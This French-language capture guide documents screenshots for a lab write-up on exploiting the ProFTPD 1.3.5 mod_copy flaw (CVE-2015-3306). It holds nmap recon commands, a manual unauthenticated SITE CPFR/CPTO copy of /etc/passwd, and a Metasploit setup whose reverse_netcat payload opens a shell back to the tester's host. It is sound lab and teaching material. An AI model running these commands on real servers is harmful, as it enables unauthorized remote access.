# Captures — ProFTPD mod_copy RCE

Consignes de capture pour `services/ftp-modcopy.html`. Commandes identiques à celles du
write-up source : `ms3/jules/ftp.md`.

## 01-recon-nmap.png

Commandes (les deux à la suite, même terminal) :
```bash
nmap -sC -sV -p 21 172.28.128.3
nmap -p 21 --script ftp-anon,ftp-syst 172.28.128.3
```

Encadrer en rouge : la ligne `21/tcp open ftp ProFTPD 1.3.5`.

## 02-recherche-module.png

Les deux commandes à la suite :
```bash
searchsploit proftpd 1.3.5
msfconsole -q -x "search proftpd; exit"
```

Encadrer en rouge : la ligne `exploit/unix/ftp/proftpd_modcopy_exec` dans le résultat de
`search` (le plus long des deux résultats — plusieurs modules ProFTPD remontent, un seul
correspond à 1.3.5).

## 03-info-cve.png

Commande :
```bash
msfconsole -q -x "info exploit/unix/ftp/proftpd_modcopy_exec; exit"
```

Capturer la section `References`. Encadrer en rouge :
`https://nvd.nist.gov/vuln/detail/CVE-2015-3306`.

## 04-poc-manuelle.png

Commande :
```bash
ftp -inv 172.28.128.3 <<'EOF'
quote SITE CPFR /etc/passwd
quote SITE CPTO /tmp/copie_passwd_test
quit
EOF
```

Encadrer en rouge : les lignes `350 File or directory exists...` et
`250 Copy successful` — la preuve que la copie fonctionne sans authentification.

## 05-exploit-config.png

Dans `msfconsole`, ligne par ligne :
```
msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 172.28.128.3
RHOSTS => 172.28.128.3
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RPORT 80
RPORT => 80
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RPORT_FTP 21
RPORT_FTP => 21
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
SITEPATH => /var/www/html
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST 172.28.128.1
LHOST => 172.28.128.1
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set PAYLOAD cmd/unix/reverse_netcat
PAYLOAD => cmd/unix/reverse_netcat
```

S'arrêter avant `exploit -z` (capture suivante). Encadrer en rouge : la ligne
`SITEPATH => /var/www/html` — point d'attention du write-up, le défaut du module
(`/var/www`) échoue.

## 06-exploit-launch.png

Suite directe :
```
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > exploit -z
[*] Started reverse TCP handler on 172.28.128.1:4447
[*] 172.28.128.3:80 - 172.28.128.3:21 - Connected to FTP server
[*] 172.28.128.3:80 - Executing PHP payload /7oRnD.php
[+] 172.28.128.3:80 - Deleted /var/www/html/7oRnD.php
[*] Command shell session 1 opened (172.28.128.1:4447 -> 172.28.128.3:xxxxx)
[-] 172.28.128.3:80 - Exploit aborted due to failure: ... Failure executing payload
[*] Exploit completed, but no session was created.
```

Encadrer en rouge : la ligne `[*] Command shell session 1 opened (...)` — **malgré** le
message d'erreur trompeur juste en dessous, la session est bien ouverte.

## 07-preuve-acces.png

Suite directe :
```
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 1 -c id
[*] Running 'id' on shell session 1 (172.28.128.3)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Encadrer en rouge : `uid=33(www-data) gid=33(www-data)` — la preuve finale d'accès.
